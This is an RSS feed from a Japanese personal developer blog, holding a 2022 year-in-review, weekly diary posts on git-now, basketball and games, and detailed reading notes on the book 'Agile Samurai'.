<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on QWYNG.dev</title><link>https://qwyng.dev/posts/</link><description>QWYNG.dev (Posts)</description><generator>Hugo -- gohugo.io</generator><language>ja</language><lastBuildDate>Sat, 31 Dec 2022 22:42:05 +0900</lastBuildDate><atom:link href="https://qwyng.dev/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>2022年の振り返り</title><link>https://qwyng.dev/posts/20221231/</link><pubDate>Sat, 31 Dec 2022 22:42:05 +0900</pubDate><guid>https://qwyng.dev/posts/20221231/</guid><description>&lt;h3 id="転職した">転職した
&lt;span>&lt;a href="#%e8%bb%a2%e8%81%b7%e3%81%97%e3%81%9f">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>公私の変化で一番大きいのはこれ。転職時はかなり悩んだのだが、最終的に厚生年金をなんかするのが面白そうということで、それができる会社に決めた。在職中も転職中も転職後もいろんな方々にお世話になりました。ありがとうございました。&lt;/p>
&lt;h3 id="大学院">大学院
&lt;span>&lt;a href="#%e5%a4%a7%e5%ad%a6%e9%99%a2">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>あと単位5つ。今年の授業の中だと関数型プログラミングが面白かった。関数型の勉強というよりはプログラムの形式手法の授業という感じで数学的帰納法を用いてプログラムの正当性を証明するという授業でかなり面白かった。テストが全部手書きだったのだけ残念。&lt;/p>
&lt;h3 id="人生">人生
&lt;span>&lt;a href="#%e4%ba%ba%e7%94%9f">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>バスケをやるようになった。運動もできるしかっこいい靴を買えて気分もいい。最高。&lt;br>
ダークネス大澤の頻度を減らしていきたい。&lt;/p>
&lt;h3 id="ゲーム">ゲーム
&lt;span>&lt;a href="#%e3%82%b2%e3%83%bc%e3%83%a0">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>LOL: ゴールドで終わってしまった。正直あんまりやる時間なかった。特にスレッシュがOPの時期にあまり触れなかったのがデカすぎる。来年は頑張りたい。&lt;br>
OW: ４年くらいやってなかったが2がでたので今年から久しぶりに復帰した。弾が当たらない。&lt;br>
他: ポケモンとポケモンユナイトは結構面白かった。&lt;/p></description></item><item><title>週報 2022-W50 git-now</title><link>https://qwyng.dev/posts/20221225/</link><pubDate>Sun, 25 Dec 2022 15:53:22 +0900</pubDate><guid>https://qwyng.dev/posts/20221225/</guid><description>&lt;ul>
&lt;li>
&lt;p>git-nowを導入した&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/iwata/git-now">https://github.com/iwata/git-now&lt;/a>&lt;/li>
&lt;li>&lt;code>git now&lt;/code> でわかりやすいコミットメッセージでコミットしてくれて、&lt;code>git now rebase&lt;/code>で&lt;code>git now&lt;/code>でコミットしたものをまとめて&lt;code>git rebase -i&lt;/code>できる&lt;/li>
&lt;li>いつもstashがごちゃついていて検索するスクリプトを書いたりしていたくらいなのでめっちゃ便利になった
&lt;ul>
&lt;li>&lt;a href="https://qwyng.dev/posts/2021/10/24/161057/">stashを検索するGitHub CLI Extensionを書いた - QWYNG.dev&lt;/a>&lt;/li>
&lt;li>逐一&lt;code>git now&lt;/code>することでブランチ間の移動が気軽に行えるようになった&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>高田馬場の力という店で前職の人たちとご飯にいった&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://tabelog.com/tokyo/A1305/A130503/13012817/">https://tabelog.com/tokyo/A1305/A130503/13012817/&lt;/a>
&lt;ul>
&lt;li>オムレツがデカすぎる&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>みんないろんな人生ですごい&lt;/li>
&lt;li>悪びれず遅刻する主催者もいた
&lt;ul>
&lt;li>&lt;a href="https://imaharu-blog.hatenadiary.jp/entry/2022/12/25/163504">週報 12/20-12/26 - ストロングゼロは睡眠薬&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>アジャイルサムライを読み直して記事を書いた&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://qwyng.dev/posts/20221223/">再読！アジャイルサムライ&lt;/a>&lt;/li>
&lt;li>開発これもうわかんねぇよ&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>縄跳びを買った&lt;/p>
&lt;ul>
&lt;li>友達にシュートフォームを見せたら体がバラバラすぎると言われたので連動性を高めたい&lt;/li>
&lt;li>というか運動したい
&lt;ul>
&lt;li>運動しないといい睡眠ができない&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>仕事&lt;/p>
&lt;ul>
&lt;li>結構テスト書いていた気がする&lt;/li>
&lt;li>あと業務時間にFallGuysして社会人した&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>pundit&lt;/p>
&lt;ul>
&lt;li>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">これリリースされたからpundit使ってるレポジトリみんなymlに追記してくれよな&lt;a href="https://t.co/mWD2qFWqPO">https://t.co/mWD2qFWqPO&lt;/a>&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1605072405604364288?ref_src=twsrc%5Etfw">December 20, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;/li>
&lt;li>punditとrspec使ってるレポジトリ全部&lt;code>rubocop.yml&lt;/code>に追記してほしい
&lt;ul>
&lt;li>僕はした&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul></description></item><item><title>再読！アジャイルサムライ</title><link>https://qwyng.dev/posts/20221223/</link><pubDate>Sun, 25 Dec 2022 09:56:08 +0900</pubDate><guid>https://qwyng.dev/posts/20221223/</guid><description>&lt;p>転職前に読んだアジャイルサムライを改めて読み直した。自分用に整理しておく。&lt;br>
個人の感想で組織を代表する意見ではありません！&lt;/p>
&lt;h2 id="第1章ざっくりわかるアジャイル開発">第1章ざっくりわかるアジャイル開発
&lt;span>&lt;a href="#%e7%ac%ac1%e7%ab%a0%e3%81%96%e3%81%a3%e3%81%8f%e3%82%8a%e3%82%8f%e3%81%8b%e3%82%8b%e3%82%a2%e3%82%b8%e3%83%a3%e3%82%a4%e3%83%ab%e9%96%8b%e7%99%ba">#&lt;/a>&lt;/span>
&lt;/h2>&lt;ul>
&lt;li>
&lt;p>本当に大事なことは動くソフトウェアを定期的に届けること&lt;/p>
&lt;ul>
&lt;li>計画を立てて、うまく行っているか検査して、真実を受け入れるといいらしい。&lt;/li>
&lt;li>価値ある成果を毎週だすのが顧客（これは経営者も含むのだろう）。
&lt;ul>
&lt;li>
&lt;ul>
&lt;li>成果を毎週というのは言葉のあやで詳細な方法は自分たちで考えろとのこと。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>大事なこと&lt;/p>
&lt;ul>
&lt;li>大きな問題を小さく&lt;/li>
&lt;li>選択と集中&lt;/li>
&lt;li>ちゃんと動くソフトウェアを届ける&lt;/li>
&lt;li>フィードバックを求める&lt;/li>
&lt;li>必要とあらば進路を変える&lt;/li>
&lt;li>成果責任を果たす
&lt;ul>
&lt;li>極論これらが果たせていれば方法はなんでもいいのだろう。&lt;/li>
&lt;li>この本ではスクラムというワードはあまりでてこないが、スクラムでは透明性、検査、適応を通してこれらを達成したい感じなのかな。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>紹介している手法は経験を共有しているだけでやらなくてはいけないものではない&lt;/p>
&lt;ul>
&lt;li>試してみてその中から使えそうなやつだけ続けていくのが良さそう
&lt;ul>
&lt;li>この考えがないとアジャハラ、スクハラになってしまう気がする。（僕は遭遇したことはない）&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第2章-アジャイルチームのご紹介">第2章 アジャイルチームのご紹介
&lt;span>&lt;a href="#%e7%ac%ac2%e7%ab%a0-%e3%82%a2%e3%82%b8%e3%83%a3%e3%82%a4%e3%83%ab%e3%83%81%e3%83%bc%e3%83%a0%e3%81%ae%e3%81%94%e7%b4%b9%e4%bb%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>機能をふんわりした構想から顧客にデリバリするまで全部やるチーム&lt;/p>
&lt;ul>
&lt;li>いわゆるフューチャーチーム
&lt;ul>
&lt;li>社でもクロスファンクショナルが熱かったり熱くなかったりする
&lt;ul>
&lt;li>自分は最初クロスファンクショナルというのはメンバー単体でなんでもやれる状態をつくることだと思っていた
&lt;ul>
&lt;li>が実はそうではなく、一人でなんでもこなすと言うよりはチームで役割にこだわらず自発的になんでもやっていくということっぽい&lt;/li>
&lt;li>アジャイルサムライでも、チームがいろんな役割をこなすが良いのではなくチームが自分たちの役割分担を自分たちで決めているのが良いことであると書いてあった
&lt;ul>
&lt;li>自己組織化していけ&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>熱心な顧客のために信頼貯金を稼げ&lt;/p>
&lt;ul>
&lt;li>信頼してけ&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第3章-みんなをバスに乗せる">第3章 みんなをバスに乗せる
&lt;span>&lt;a href="#%e7%ac%ac3%e7%ab%a0-%e3%81%bf%e3%82%93%e3%81%aa%e3%82%92%e3%83%90%e3%82%b9%e3%81%ab%e4%b9%97%e3%81%9b%e3%82%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>今見ると表題が完全にLOLである。
&lt;ul>
&lt;li>バスを運転しろ。&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;ul>
&lt;li>プロジェクトの期待と認識を揃えろ
&lt;ul>
&lt;li>揃ってたほうが打ち手も正確になりそう&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第4章全体像を捉える">第4章　全体像を捉える
&lt;span>&lt;a href="#%e7%ac%ac4%e7%ab%a0%e5%85%a8%e4%bd%93%e5%83%8f%e3%82%92%e6%8d%89%e3%81%88%e3%82%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>&lt;code>Why here we are&lt;/code>
&lt;ul>
&lt;li>これがないと期待されていることと関係ないことに時間を浪費してしまう&lt;/li>
&lt;li>正直株式会社組織で働いている以上「株価を上げる」から始まって「プロダクトの売上が伸びる」とか「チャーンを低くする」とがが目的になると思うのだが、もっと噛み砕いて、「〇〇がめっちゃ便利になる、同じような商品とは〇〇が違う」ぐらいまでは具体的に言えるとユーザーストーリーの優先度等が話しやすくなると思った&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>パッケージデザインをつくろう
&lt;ul>
&lt;li>これは自分もやってみたいと考えていた&lt;/li>
&lt;li>どんな製品を作りたいか考えるときに製品のLPから先につくれば、なにを売りたいのか？どんな機能が充実しているべきなのか？逆にやらなくてもいいことは？がLP上に現れると思う
&lt;ul>
&lt;li>セキュリティが大事なtoB製品ならデカデカとセキュリティしっかりしてますマークをLPに書くだろうし、toCで差別化が重要ならデカデカとその点をLPに書くだろう。文字だけよりよっぽどチームの認識が揃いやすいのではないかと思う&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第5章-具現化させる">第5章 具現化させる
&lt;span>&lt;a href="#%e7%ac%ac5%e7%ab%a0-%e5%85%b7%e7%8f%be%e5%8c%96%e3%81%95%e3%81%9b%e3%82%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>チームで取り組む値打ちのあるリスクにだけ投資する
&lt;ul>
&lt;li>心配してもしょうがないことを心配したり改善しようとすると疲れる&lt;/li>
&lt;li>判断がつかなかったら祈れと書いてあって草だった&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>トレードオフスライダー
&lt;ul>
&lt;li>やったことがある
&lt;ul>
&lt;li>時間と予算は簡単（決まっている）のだが、品質というワードが定義からして皆バラバラである
&lt;ul>
&lt;li>ある人はちゃんとテストがあることを品質と言うし、ある人はSLOを高めに設定することが品質だと思っているし、また別の人はユーザー体験の質を品質と考えている
&lt;ul>
&lt;li>自分も品質ってなんなのかわかってないし、これだ！という一声を成功者が発していればそれになるのも違うと思う&lt;/li>
&lt;li>というか時間も予算も品質もどうせ固定されるってアジャイルサムライに書いてあるので最初からスコープの話だけするトレードオフスライダーとかやったほうが良いのではないだろうか&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第6章-ユーザーストーリーを集める">第6章 ユーザーストーリーを集める
&lt;span>&lt;a href="#%e7%ac%ac6%e7%ab%a0-%e3%83%a6%e3%83%bc%e3%82%b6%e3%83%bc%e3%82%b9%e3%83%88%e3%83%bc%e3%83%aa%e3%83%bc%e3%82%92%e9%9b%86%e3%82%81%e3%82%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>情報を伝えるもっとも効率的な方法はフェイス・トゥ・フェイスで話をすることです
&lt;ul>
&lt;li>はい&amp;hellip;&lt;/li>
&lt;li>ユーザーストーリーは簡潔に書きたいから小さいインデックスカードに書くと良い
&lt;ul>
&lt;li>なるほど&lt;/li>
&lt;li>大体のチケット管理ツールは文書欄がデカすぎる。&lt;/li>
&lt;li>ビジネスの観点から評価できること
&lt;ul>
&lt;li>ビジネス側と仕事せよって第二章にも書いてある&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第7章-見積もり-当てずっぽうの奥義">第7章 見積もり: 当てずっぽうの奥義
&lt;span>&lt;a href="#%e7%ac%ac7%e7%ab%a0-%e8%a6%8b%e7%a9%8d%e3%82%82%e3%82%8a-%e5%bd%93%e3%81%a6%e3%81%9a%e3%81%a3%e3%81%bd%e3%81%86%e3%81%ae%e5%a5%a5%e7%be%a9">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>当てずっぽうを前提に
&lt;ul>
&lt;li>そらそう&lt;/li>
&lt;li>Netlifyはポイントをフルーツで例えているらしい。イメージしやすさが大事で数字より良い点もあるかもしれない
&lt;ul>
&lt;li>&lt;a href="https://fberriman.com/2020/01/22/fruit-salad-a-scrum-estimation-scale/">https://fberriman.com/2020/01/22/fruit-salad-a-scrum-estimation-scale/&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>調査タイムも言及されている&lt;/li>
&lt;li>プランニングポーカーについても言及がある
&lt;ul>
&lt;li>基本1か3か5があれば良いらしい&lt;/li>
&lt;li>自分たちもだいたい松竹梅ぐらいでしか見積もりしてない気がするし正しそう
&lt;ul>
&lt;li>どうせ精密ではないのだから&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第8章-アジャイルな計画づくり現実と向きあう">第8章 アジャイルな計画づくり：現実と向きあう
&lt;span>&lt;a href="#%e7%ac%ac8%e7%ab%a0-%e3%82%a2%e3%82%b8%e3%83%a3%e3%82%a4%e3%83%ab%e3%81%aa%e8%a8%88%e7%94%bb%e3%81%a5%e3%81%8f%e3%82%8a%e7%8f%be%e5%ae%9f%e3%81%a8%e5%90%91%e3%81%8d%e3%81%82%e3%81%86">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>プロジェクトの状況も、顧客のやりたいこともころころ変わる
&lt;ul>
&lt;li>そりゃそう&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>ユーザーストーリーが増えたら別のユーザーストーリーを減らしてもらう
&lt;ul>
&lt;li>期日かスコープ減らすか&lt;/li>
&lt;li>基本は後者で&lt;/li>
&lt;li>無理なら全て打ち明けて黙って座って待ち続けるらしい
&lt;ul>
&lt;li>深いなぁ&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>残作業と消化速度を見積もれ
&lt;ul>
&lt;li>そりゃそう&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>スコープも期日も予算も固定されていたらどうするの？
&lt;ul>
&lt;li>どうせ無理だから隠すかさらけ出すしかない&lt;/li>
&lt;li>そりゃそう。
&lt;ul>
&lt;li>捨てたスコープを記録しておくと監査担当も楽なので○らしい&lt;/li>
&lt;li>いいネ&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第9章-イテレーションの運営-実現させる">第9章 イテレーションの運営: 実現させる
&lt;span>&lt;a href="#%e7%ac%ac9%e7%ab%a0-%e3%82%a4%e3%83%86%e3%83%ac%e3%83%bc%e3%82%b7%e3%83%a7%e3%83%b3%e3%81%ae%e9%81%8b%e5%96%b6-%e5%ae%9f%e7%8f%be%e3%81%95%e3%81%9b%e3%82%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>ユーザーストーリーをJITコンパイルしていけ
&lt;ul>
&lt;li>はい..&lt;/li>
&lt;li>分析に使う手法はたくさんあるので模索していけ
&lt;ul>
&lt;li>はい…&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>開発はとりあえず自動テストを書いてCIに利用すること。TDDもいいぞ！
&lt;ul>
&lt;li>そりゃそう&lt;/li>
&lt;li>常に「テストが通ってるならGOGO」の状態を作らなくちゃいけないと思う&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>たとえ自動テストがあっても形式ばった受け入れテストはなくさない方がいい
&lt;ul>
&lt;li>受け入れテストはスプリントレビューのこと&lt;/li>
&lt;li>顧客は文字のチェックリストだけではわからない。動いているソフトウェアを動かして初めて本気でチェックしてもらえる
&lt;ul>
&lt;li>確かに&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>カンバン
&lt;ul>
&lt;li>ストーリーボードと違って、カンバンはチームをイテレーションから開放させるという点が決定的に違う
&lt;ul>
&lt;li>なるほど&lt;/li>
&lt;li>カンバンとストーリーボードの違いが言語化されていて良い。本番環境へのサポート等現実的な悩みに対応している。&lt;/li>
&lt;li>カンバンはイテレーションとは違うというのは改めて読んでみると興味深い記述。ストーリーポイントはいらないし、優先順位だけが全てらしい。ホントか？&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第10章-アジャイルな意思疎通の作戦">第10章 アジャイルな意思疎通の作戦
&lt;span>&lt;a href="#%e7%ac%ac10%e7%ab%a0-%e3%82%a2%e3%82%b8%e3%83%a3%e3%82%a4%e3%83%ab%e3%81%aa%e6%84%8f%e6%80%9d%e7%96%8e%e9%80%9a%e3%81%ae%e4%bd%9c%e6%88%a6">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>イテレーション計画ミーティング
&lt;ul>
&lt;li>次回のイテレーションの具体的作業を計画したり、現状のプロジェクトの健康状態を確認する。&lt;/li>
&lt;li>これはアジャイルサムライの内容からは脱線するが、イテレーションの具体的作業内容（〇〇を実装する、レビューする等）を見える形で可視化しておくと作業の進捗が確認しやすい。前職でも現職でも同じような作業を見かけたが、結構役立っていそうな気配を感じた。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>ミニ振り返り
&lt;ul>
&lt;li>振り返りが10分とか15分で終わってほしい&amp;hellip;&lt;/li>
&lt;li>振り返りは魔女狩りではない
&lt;ul>
&lt;li>日頃思っているが口にできないこととして、振り返りで毎回TRYをひねり出すのは辛いというのがある。
&lt;ul>
&lt;li>とりあえず放置しちゃまずいかな？解決策でるまでちゃんと話あったほうがいいのかな&amp;hellip;&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第11章-現場の状況を目に見えるようにする">第11章: 現場の状況を目に見えるようにする
&lt;span>&lt;a href="#%e7%ac%ac11%e7%ab%a0-%e7%8f%be%e5%a0%b4%e3%81%ae%e7%8a%b6%e6%b3%81%e3%82%92%e7%9b%ae%e3%81%ab%e8%a6%8b%e3%81%88%e3%82%8b%e3%82%88%e3%81%86%e3%81%ab%e3%81%99%e3%82%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>経営陣にちゃんと状況を説明する
&lt;ul>
&lt;li>これを説得力もってやりたいから色々記録してる&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>用語を共有する
&lt;ul>
&lt;li>現場で使う用語とDBのカラム名とかがピッタリ合ってるプロダクトは強い
&lt;ul>
&lt;li>しかし毎回要求も変わっていくなかでそれができるのか？&lt;/li>
&lt;li>開発者も最初はドメイン知識薄いわけだし&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>この章には最高の文章があるので引用したい&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>うまくいかないときの根本原因は、感情に起因していることが多いものだ。 おそらくは、 お前が実現したいと思っている方向とは正反対の向きに引っ張る力が作用しておるのだ。 お前が立ち回る相手は、 お前のやり方への抵抗それ自体ではない。 その背後にある精神構造だ。&lt;/p>
&lt;/blockquote>
&lt;ul>
&lt;li>つまるところ仕事全部これ！&lt;/li>
&lt;/ul>
&lt;h3 id="第12章-ユニットテスト-動くことがわかる">第12章 ユニットテスト: 動くことがわかる
&lt;span>&lt;a href="#%e7%ac%ac12%e7%ab%a0-%e3%83%a6%e3%83%8b%e3%83%83%e3%83%88%e3%83%86%e3%82%b9%e3%83%88-%e5%8b%95%e3%81%8f%e3%81%93%e3%81%a8%e3%81%8c%e3%82%8f%e3%81%8b%e3%82%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>テスト書け
&lt;ul>
&lt;li>あたり前田のクラッカー
&lt;ul>
&lt;li>全部を網羅するのは無理そうな箇所でも少しでも書く&lt;/li>
&lt;li>大事そう。&lt;/li>
&lt;li>この章では色々なテストに関する記事へのリンクがあるが、特にこれは良かった
&lt;ul>
&lt;li>&lt;a href="http://objectclub.jp/community/XP-jp/xp_relate/testinfected-j">テスト熱中症&lt;/a>
&lt;ul>
&lt;li>2000年時点でCIの重要性が書かれていてすごい。
&lt;ul>
&lt;li>個人的には無駄な共通化して後悔してことはあるが、テスト書きすぎて後悔したことはない。本当に必要なテストか厳選するのも大事だが、テストを消すのは実装を消すより10000倍簡単だ&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第13章-リファクタリング-技術的負債の返済">第13章 リファクタリング: 技術的負債の返済
&lt;span>&lt;a href="#%e7%ac%ac13%e7%ab%a0-%e3%83%aa%e3%83%95%e3%82%a1%e3%82%af%e3%82%bf%e3%83%aa%e3%83%b3%e3%82%b0-%e6%8a%80%e8%a1%93%e7%9a%84%e8%b2%a0%e5%82%b5%e3%81%ae%e8%bf%94%e6%b8%88">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>技術的負債
&lt;ul>
&lt;li>なにかと荒れがちな話題
&lt;ul>
&lt;li>変更しづらいから変更しやすくしたい！が根源的な欲求だと思う
&lt;ul>
&lt;li>ソフトウェアは進化し続けていくことに価値があるので&lt;/li>
&lt;li>名前を変えたり、それこそテストを足すとかも変更しやすくする方法として最高だと思う&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>リファクタリングの投資対効果
&lt;ul>
&lt;li>投資対効果に言及してあるのが良い&lt;/li>
&lt;li>開発者は自分の人件費がこの負債によってどれくらい無駄になっているのか説明する必要があると思う&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第14章-テスト駆動開発">第14章 テスト駆動開発
&lt;span>&lt;a href="#%e7%ac%ac14%e7%ab%a0-%e3%83%86%e3%82%b9%e3%83%88%e9%a7%86%e5%8b%95%e9%96%8b%e7%99%ba">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>TDD
&lt;ul>
&lt;li>やると気分はいいのだが結構実装を先に書いてしまうことが多い
&lt;ul>
&lt;li>なんとなく実装を書く -&amp;gt; テストを書く -&amp;gt; 実装をちゃんと書く
&lt;ul>
&lt;li>なんとなく書いた実装をリファクタリングしてもテストが通っていることが確認できて最終的に良い実装になる気がする。&lt;/li>
&lt;li>ただこの手順の問題点はテストが実装を知っているようなテストになりがちなこと
&lt;ul>
&lt;li>すぐ壊れるテストになりかねない。&lt;/li>
&lt;li>がテストは簡単に消せるし良いのでは？とも思い始めている&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="第15章-継続的インテグレーション-リリースに備える">第15章: 継続的インテグレーション: リリースに備える
&lt;span>&lt;a href="#%e7%ac%ac15%e7%ab%a0-%e7%b6%99%e7%b6%9a%e7%9a%84%e3%82%a4%e3%83%b3%e3%83%86%e3%82%b0%e3%83%ac%e3%83%bc%e3%82%b7%e3%83%a7%e3%83%b3-%e3%83%aa%e3%83%aa%e3%83%bc%e3%82%b9%e3%81%ab%e5%82%99%e3%81%88%e3%82%8b">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>いつでもリリース可能な状態をつくる
&lt;ul>
&lt;li>レポジトリ、ビルドの自動化、チェックイン
&lt;ul>
&lt;li>開発者が気をつけるべきこととして作業単位を小さくすることが挙げられている。
&lt;ul>
&lt;li>インテグレーションの頻度が高いほど（取り込む差分が小さいほど）簡単に統合できるのはそりゃそうである。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="最後に">最後に
&lt;span>&lt;a href="#%e6%9c%80%e5%be%8c%e3%81%ab">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>アジャイルであるかなんて気にしない
&lt;ul>
&lt;li>良く「アジャイルが状態でスクラムが手法」みたいに言われることが多い
&lt;ul>
&lt;li>自分もそう思っていた
&lt;ul>
&lt;li>が、アジャイルサムライにはアジャイルであることはどうでも良くて大切なのは素晴らしいプロダクトを顧客に届けることと書いてあった
&lt;ul>
&lt;li>いい話&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;section class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1" role="doc-endnote">
&lt;p>LOLというチームゲームでは試合を一人で勝ちに導くことをバスを運転すると比喩する文化がある。バスはたまに横転する。&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/section></description></item><item><title>週報2022-W50 エアジョーダン37PF</title><link>https://qwyng.dev/posts/20221218/</link><pubDate>Sun, 18 Dec 2022 20:29:31 +0900</pubDate><guid>https://qwyng.dev/posts/20221218/</guid><description>&lt;ul>
&lt;li>
&lt;p>仕事&lt;/p>
&lt;ul>
&lt;li>何やらRLSをバイパスしそうな気配がある。&lt;/li>
&lt;li>テーブルを作らないとユーザーに権現付与できないがテーブルは作りたくないとかそんなことで悩んでいたような気がする&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>OW&lt;/p>
&lt;ul>
&lt;li>最近ゼニャッタが面白い。攻撃しながらヒールできるのが一石二鳥感ある&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>シズラー&lt;/p>
&lt;ul>
&lt;li>大塚シズラーで「俺は痩せない」的なメッセージが書いてあるシャツを着た人が楽しそうに食事してて良すぎた&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>自炊&lt;/p>
&lt;ul>
&lt;li>友達の料理人に教えてもらったストウブカオマンガイがOPすぎる。10分でつくれるので忙しいあなたも安心&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>本&lt;/p>
&lt;ul>
&lt;li>他人を助けると幸せになるらしい。人生か！？&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>バスケ&lt;/p>
&lt;ul>
&lt;li>社の人たちとバスケした&lt;/li>
&lt;li>バスケ面白すぎるのでボールとバッシュを買った。エアジョーダン37PFって名前からしてかっこよすぎる。落ちものパズルと同じでシュート入るとストレスが緩和される気がする
&lt;img src="https://lh3.googleusercontent.com/_SHUI6o65_MZm2SoxoaVcvCkmWLvDYxOqaWRyqPUz4dkEQnPepzXST7CJoNIlR_O9yW1UwmQbzUA1ZXfwdVeY-qHtQNF-8I-5gId817UtG_ojQ8gtSOD4J_tcfo-V8toDxiRSWn8xg=w2400" alt="">&lt;/li>
&lt;li>シューティングの運動強度がちょうど良くて夜よく眠れる&lt;/li>
&lt;li>川崎に年末まで無料でコート借りれる場所があったので行ってみた。整備されてるし駅から近いし神。川崎には全てがある
&lt;ul>
